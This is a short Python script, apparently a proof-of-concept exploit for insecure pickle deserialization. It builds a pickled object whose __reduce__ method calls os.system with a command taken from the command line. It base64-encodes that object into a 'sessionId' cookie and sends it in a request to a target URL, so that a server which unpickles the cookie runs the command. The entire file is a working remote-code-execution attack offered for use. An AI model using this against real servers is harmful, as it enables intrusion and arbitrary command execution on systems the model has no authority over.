import pickle
import os
import base64
import sys
import requests

cmd = str(sys.argv[1])
url = str(sys.argv[2])


class Exploit(object):
    def __reduce__(self):
        return (os.system, (cmd, ))


pickle_result = pickle.dumps(Exploit())

result = str(base64.b64encode(pickle_result), "utf-8")

print(result)
print(cmd)
print(url)

cookie = {'sessionId': result}

print(cookie)

r = requests.get(url, cookies=cookie)